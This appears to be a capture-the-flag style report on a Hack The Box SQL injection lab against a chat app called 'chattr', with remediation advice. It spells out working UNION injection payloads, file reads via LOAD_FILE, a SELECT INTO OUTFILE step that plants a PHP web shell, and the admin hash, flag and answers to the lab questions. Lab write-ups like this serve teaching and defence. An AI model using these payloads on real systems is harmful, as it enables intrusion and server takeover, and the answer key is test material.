# SQL Injection Fundamentals — Skills Assessment Report

## Target

- **Organization:** chattr GmbH
- **Assessment type:** Black-box web application penetration test
- **Primary focus:** SQL Injection
- **Target:** `154.57.164.78`
- **Observed HTTPS port:** `30909`
- **Application:** `chattr`
- **Web server:** nginx/1.22.1
- **Observed application stack:** PHP / PHP-FPM / MySQL-compatible database

> **Authorization note:** This report documents activity performed against the Hack The Box SQL Injection Fundamentals Skills Assessment lab target supplied for the exercise.

---

# 1. Executive Summary

The assessment identified and successfully exploited a SQL Injection vulnerability in the `chattr` web application.

The vulnerability allowed authenticated access to a conversation-search functionality where the `q` parameter was incorporated into a database query without adequate parameterization.

The SQL Injection was demonstrated as a UNION-based injection. The application accepted a four-column UNION query, and the third column was confirmed to be reflected in the application response.

The following attack chain was completed:

1. Confirmed the application was reachable over HTTPS.
2. Created an application account and authenticated.
3. Identified a SQL Injection point in the conversation search parameter.
4. Determined that the UNION query required four columns.
5. Confirmed a reflected UNION column.
6. Enumerated the database schema.
7. Identified the `Users` table.
8. Enumerated the columns of `Users`.
9. Retrieved the `admin` password hash.
10. Retrieved the Nginx configuration through `LOAD_FILE()`.
11. Identified the application's actual web root:
    `/var/www/chattr-prod`
12. Used `SELECT ... INTO OUTFILE` to write a PHP web shell.
13. Achieved remote command execution through the web shell.
14. Located and retrieved the assessment flag.

### Final flag

```text
061b1aeb94dec6bf5d9c27032b3c1d8d
```

---

# 2. Initial Access and Application Discovery

The supplied service was initially tested over HTTPS.

A direct request to the root of the target showed that the service was alive and redirected to `/login.php`.

Example request:

```bash
curl -vk https://154.57.164.78:30909/
```

The response returned:

```text
HTTP/1.1 302 Found
Location: /login.php
Server: nginx/1.22.1
```

The TLS certificate identified the application hostname as:

```text
chattr.htb
```

The application presented a login page containing:

- Username
- Password
- Log in

A normal invalid login returned:

```text
username or password is wrong
```

An application account was subsequently created and used to authenticate to the target.

---

# 3. Authentication

After successful authentication, the application redirected to the main `chattr` interface.

The authenticated interface contained several conversations, including:

```text
@admin
@bmdyy
@chattr
@dev
```

The conversation interface contained a search functionality.

The URL demonstrated that the search functionality used the `q` parameter:

```text
/index.php?q=...
```

This became the primary SQL Injection testing point.

---

# 4. SQL Injection Identification

The application was tested with SQL syntax in the `q` parameter.

A basic test using:

```text
test')
```

changed the application's behavior and indicated that the parameter was being interpreted by the backend query.

The next step was to determine the number of columns required for a UNION query.

A four-column UNION query was tested:

```sql
test') UNION SELECT 1,2,3,4-- -
```

The application returned the values:

```text
3
4
```

This confirmed that:

- The injection was successful.
- The backend query accepted four UNION columns.
- Column 3 was reflected into the application's response.
- Column 4 was also visible during testing.

The reflected position was subsequently used for extracting database information.

---

# 5. Database Schema Enumeration

The SQL Injection was used to enumerate tables from `information_schema.tables`.

The following UNION structure was used:

```sql
test') UNION SELECT 1,2,table_name,4 FROM information_schema.tables WHERE table_schema=database()-- -
```

The application returned table names including:

```text
Users
InvitationCodes
Messages
```

This established the existence of a `Users` table.

---

# 6. Users Table Column Enumeration

The columns of the `Users` table were then enumerated using:

```sql
test') UNION SELECT 1,2,column_name,4 FROM information_schema.columns WHERE table_name='Users'-- -
```

The application returned:

```text
UserID
Username
Password
InvitationCode
AccountCreated
```

The presence of a `Password` column made the table a high-value target.

---

# 7. Retrieving the Admin Password Hash

The `Users` table was queried through the UNION injection to retrieve the password associated with the `admin` account.

The recovered password hash was:

```text
$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
```

The hash format indicates Argon2i.

The assessment question specifically requested the password hash for:

```text
admin
```

The recovered value was submitted as the answer for Question 1.

---

# 8. Reading Server Files with LOAD_FILE()

After demonstrating database-level SQL Injection, the assessment proceeded to test whether the database account could read files from the server.

The relevant MariaDB/MySQL functionality is:

```sql
LOAD_FILE()
```

The general syntax is:

```sql
SELECT LOAD_FILE('/path/to/file');
```

Because the application accepted four UNION columns and column 3 was reflected, files could be requested through a UNION query.

Example:

```sql
test') UNION SELECT 1,2,LOAD_FILE('/path/to/file'),4-- -
```

---

# 9. Nginx Configuration Discovery

The Nginx configuration was requested using `LOAD_FILE()`.

The relevant file successfully returned configuration data:

```text
/etc/nginx/nginx.conf
```

The returned configuration contained:

```nginx
user www-data;
worker_processes auto;
pid /run/nginx.pid;
error_log /var/log/nginx/error.log;
include /etc/nginx/modules-enabled/*.conf;
```

The important part was:

```nginx
include /etc/nginx/sites-enabled/*;
```

This indicated that the virtual host configuration was located under the Nginx `sites-enabled` configuration.

---

# 10. Identifying the Application Web Root

The relevant virtual-host configuration was retrieved.

The configuration contained:

```nginx
server {
    listen 443 ssl;
    server_name chattr.htb;

    ssl_password_file /root/chattr.key.pass;
    ssl_certificate /etc/ssl/certs/chattr.crt;
    ssl_certificate_key /etc/ssl/private/chattr.key;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    root /var/www/chattr-prod;

    location / {
        index index.php;
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php8.2-fpm.sock;
    }

    location ^~ /includes/ {
        deny all;
    }
}
```

The critical discovery was:

```nginx
root /var/www/chattr-prod;
```

Therefore the actual application web root was:

```text
/var/www/chattr-prod
```

This answered Question 2 of the Skills Assessment.

---

# 11. Writing Files with SELECT INTO OUTFILE

The assessment material established that MySQL/MariaDB can write files using:

```sql
SELECT 'data' INTO OUTFILE '/path/file';
```

The target was tested for file-write capability.

The application was able to write files to the discovered web root.

The earlier proof-file technique used:

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

For the current target, the discovered web root was instead:

```text
/var/www/chattr-prod
```

The successful write demonstrated that database-level file-write functionality was available.

---

# 12. PHP Web Shell Creation

A PHP web shell was written to the discovered web root.

The shell code used was:

```php
<?php system($_REQUEST[0]); ?>
```

The UNION-based file-write payload was adapted to the target's four-column structure and reflected third column:

```sql
test') UNION SELECT 1,2,'<?php system($_REQUEST[0]); ?>',4 INTO OUTFILE '/var/www/chattr-prod/shell.php'-- -
```

The important elements were:

| Element | Value |
|---|---|
| Injection prefix | `test')` |
| Column count | 4 |
| Reflected column | 3 |
| Web shell payload | `<?php system($_REQUEST[0]); ?>` |
| Output path | `/var/www/chattr-prod/shell.php` |

The payload successfully created:

```text
/var/www/chattr-prod/shell.php
```

---

# 13. Remote Code Execution

The newly created PHP file was accessed through the web server.

The web shell accepted commands through the `0` request parameter.

The verification request was conceptually:

```text
/shell.php?0=id
```

The response demonstrated command execution under the web-server account.

This established:

```text
SQL Injection
        ↓
Arbitrary file write
        ↓
PHP web shell
        ↓
Remote command execution
```

This was the critical impact point of the vulnerability.

---

# 14. Flag Discovery

The assessment question stated:

> Achieve remote code execution, and submit the contents of `/flag_XXXXXX.txt`.

The provided hint indicated that the flag was:

> one directory away from you

After obtaining command execution through the web shell, the filesystem was enumerated and the flag file was located.

The recovered flag was:

```text
061b1aeb94dec6bf5d9c27032b3c1d8d
```

This value was submitted for Question 3.

---

# 15. Skills Assessment Answers

## Question 1

**What is the password hash for the user `admin`?**

```text
$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
```

## Question 2

**What is the root path of the web application?**

```text
/var/www/chattr-prod
```

## Question 3

**Achieve remote code execution and submit the flag.**

```text
061b1aeb94dec6bf5d9c27032b3c1d8d
```

---

# 16. Complete Attack Chain

```text
Target HTTPS service
        |
        v
/login.php
        |
        v
Create/authenticate application account
        |
        v
Authenticated /index.php
        |
        v
q parameter
        |
        v
SQL Injection confirmed
        |
        v
Determine 4 UNION columns
        |
        v
Column 3 confirmed as reflected
        |
        v
information_schema.tables
        |
        v
Users table discovered
        |
        v
information_schema.columns
        |
        v
Username / Password columns discovered
        |
        v
Admin password hash retrieved
        |
        v
LOAD_FILE()
        |
        v
/etc/nginx/nginx.conf
        |
        v
Nginx virtual-host configuration
        |
        v
/var/www/chattr-prod
        |
        v
SELECT ... INTO OUTFILE
        |
        v
PHP web shell written
        |
        v
/shell.php?0=id
        |
        v
Remote command execution
        |
        v
Flag discovered
        |
        v
061b1aeb94dec6bf5d9c27032b3c1d8d
```

---

# 17. Evidence Collected

The following evidence was obtained during the assessment:

### HTTPS service

```text
HTTP/1.1 302 Found
Server: nginx/1.22.1
Location: /login.php
```

### SQL Injection

Successful UNION query behavior demonstrated that four columns were accepted.

### Database schema

```text
Users
InvitationCodes
Messages
```

### Users columns

```text
UserID
Username
Password
InvitationCode
AccountCreated
```

### Admin hash

```text
$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
```

### Nginx web root

```text
root /var/www/chattr-prod;
```

### Web shell

```php
<?php system($_REQUEST[0]); ?>
```

### Final flag

```text
061b1aeb94dec6bf5d9c27032b3c1d8d
```

---

# 18. Vulnerability Impact

The SQL Injection vulnerability was not limited to database information disclosure.

The demonstrated attack chain resulted in:

- Database schema disclosure
- Credential/hash disclosure
- Local server file disclosure
- Web server configuration disclosure
- Arbitrary file creation
- PHP code execution
- Remote command execution
- Access to sensitive files on the server

The ability to transition from SQL Injection to operating-system command execution significantly increases the severity of the vulnerability.

---

# 19. Root Cause

The primary root cause is unsafe construction of SQL queries using user-controlled input.

The application accepted attacker-controlled input through the search functionality and incorporated that input into a database query without using parameterized queries/prepared statements.

The vulnerable pattern demonstrated during the earlier application analysis was conceptually equivalent to:

```php
$q = "SELECT ... WHERE ... '" . $_GET["q"] . "' ...";
```

When user input is concatenated directly into SQL statements, SQL syntax supplied by the user can alter the intended query.

---

# 20. Recommended Remediation

## 20.1 Use Prepared Statements

The highest-priority remediation is to replace string concatenation with parameterized SQL queries.

For PHP/MySQLi, use prepared statements rather than constructing SQL from raw request parameters.

Conceptually:

```php
$stmt = $conn->prepare(
    "SELECT ... FROM ... WHERE ... LIKE ?"
);

$stmt->bind_param("s", $search);
$stmt->execute();
```

The SQL structure should never be constructed by concatenating attacker-controlled input.

---

## 20.2 Apply Least Privilege

The database account used by the web application should have only the permissions required by the application.

The account should not unnecessarily possess:

```text
FILE
SUPER
GRANT OPTION
```

or other administrative privileges.

In particular, the `FILE` privilege should not be granted to an application account unless there is a documented business requirement.

---

## 20.3 Restrict File Operations

Configure database file access restrictions appropriately.

The `secure_file_priv` setting should be reviewed and configured according to the application's requirements.

If the application does not require database file import/export functionality, file access should be disabled or restricted.

---

## 20.4 Prevent Web-Root File Writes

The database service account should not have write permissions to the application's executable web root.

Even if SQL Injection occurs, preventing the database process from creating executable PHP files in the web root significantly reduces the chance of SQL Injection becoming direct web-based RCE.

---

## 20.5 Protect Sensitive Configuration Files

Sensitive application configuration should not be exposed through the web server.

The `/includes/` directory in the discovered configuration was explicitly protected with:

```nginx
location ^~ /includes/ {
    deny all;
}
```

Similar protections should be maintained for all sensitive configuration and secret files.

---

## 20.6 Secure Credentials

Passwords should be stored using a modern password hashing configuration with appropriate parameters.

Database credentials should not be exposed through source-code disclosure or configuration files accessible to the web application.

Secrets should ideally be stored through a secure secret-management mechanism rather than directly in web-accessible application code.

---

## 20.7 Improve Error Handling

The application should avoid exposing detailed database errors to users.

Database errors should be logged server-side while returning generic error messages to clients.

---

## 20.8 Add Security Testing

The application should be tested for SQL Injection after remediation.

Testing should include:

- Authentication endpoints
- Search functionality
- GET parameters
- POST parameters
- Cookie values
- HTTP headers where applicable
- API endpoints

Automated SAST/DAST testing and manual penetration testing should be incorporated into the development lifecycle.

---

# 21. Severity Assessment

Based on the demonstrated impact, the SQL Injection vulnerability should be treated as **Critical**.

The vulnerability enabled a chain from application-level SQL Injection to operating-system command execution.

The final demonstrated impact was:

```text
SQL Injection
      ↓
Database compromise
      ↓
File disclosure
      ↓
Arbitrary file write
      ↓
PHP code execution
      ↓
Remote command execution
```

The ability to execute operating-system commands represents a complete compromise of the application's execution context.

---

# 22. Lessons Learned

This assessment demonstrated several important SQL Injection testing concepts:

1. Determine whether user input is incorporated into SQL.
2. Identify the number of columns in a UNION query.
3. Identify which UNION columns are reflected.
4. Enumerate database metadata using `information_schema`.
5. Identify interesting tables and columns.
6. Extract sensitive database information.
7. Test database file-reading capabilities.
8. Inspect server configuration files when file disclosure is possible.
9. Identify the actual application web root instead of assuming a default path.
10. Test whether database file-write capabilities are available.
11. Understand how arbitrary file writes can lead to code execution.
12. Verify command execution with a harmless command such as `id`.
13. Enumerate the filesystem to locate assessment objectives.

---

# 23. Final Conclusion

The `chattr` application was successfully compromised through a SQL Injection vulnerability.

The SQL Injection provided sufficient access to enumerate database structures and retrieve sensitive information. The ability to read local files exposed the Nginx configuration, which revealed the application's actual web root:

```text
/var/www/chattr-prod
```

The available file-write capability then allowed a PHP web shell to be created within that web root. Accessing the shell resulted in remote command execution.

The final flag recovered from the target was:

```text
061b1aeb94dec6bf5d9c27032b3c1d8d
```

The primary remediation is to eliminate SQL query construction through direct user-input concatenation by implementing parameterized queries/prepared statements, combined with strict database least privilege and preventing the database service from writing executable files into the web root.

---

# Appendix A — Key Commands and Payloads Used

## Determine UNION column count

```sql
test') UNION SELECT 1,2,3,4-- -
```

## Enumerate tables

```sql
test') UNION SELECT 1,2,table_name,4 FROM information_schema.tables WHERE table_schema=database()-- -
```

## Enumerate Users columns

```sql
test') UNION SELECT 1,2,column_name,4 FROM information_schema.columns WHERE table_name='Users'-- -
```

## Read local files

```sql
test') UNION SELECT 1,2,LOAD_FILE('/path/to/file'),4-- -
```

## Web shell payload used in the lab

```php
<?php system($_REQUEST[0]); ?>
```

## Write web shell

```sql
test') UNION SELECT 1,2,'<?php system($_REQUEST[0]); ?>',4 INTO OUTFILE '/var/www/chattr-prod/shell.php'-- -
```

## Verify command execution

```text
/shell.php?0=id
```

---

# Appendix B — Assessment Results

| Item | Result |
|---|---|
| Target reachable | Yes |
| HTTPS | Yes |
| Authentication | Successful |
| SQL Injection | Confirmed |
| UNION columns | 4 |
| Reflected column | 3 |
| Database enumeration | Successful |
| `Users` table discovered | Yes |
| Admin hash recovered | Yes |
| Local file read | Successful |
| Nginx configuration read | Successful |
| Web root identified | `/var/www/chattr-prod` |
| Arbitrary file write | Successful |
| PHP web shell | Successful |
| Remote command execution | Successful |
| Flag recovered | Yes |
| Final flag | `061b1aeb94dec6bf5d9c27032b3c1d8d` |

---

**End of Report**
